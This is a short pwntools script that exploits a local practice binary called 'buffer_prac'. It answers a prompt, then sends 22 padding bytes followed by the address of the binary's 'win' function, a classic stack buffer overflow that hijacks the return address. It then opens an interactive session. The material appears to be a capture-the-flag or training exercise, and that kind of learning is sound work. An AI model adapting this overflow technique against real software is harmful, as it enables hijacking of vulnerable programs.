from pwn import *

pty = process.PTY

p = process("./buffer_prac", stdin=pty, stdout=pty)

p.sendlineafter(b"between 32 - 126?\n", b"67")

p.sendlineafter(b"y\\n \n", b"a" * 22 + p64(p.elf.symbols["win"]))


p.interactive()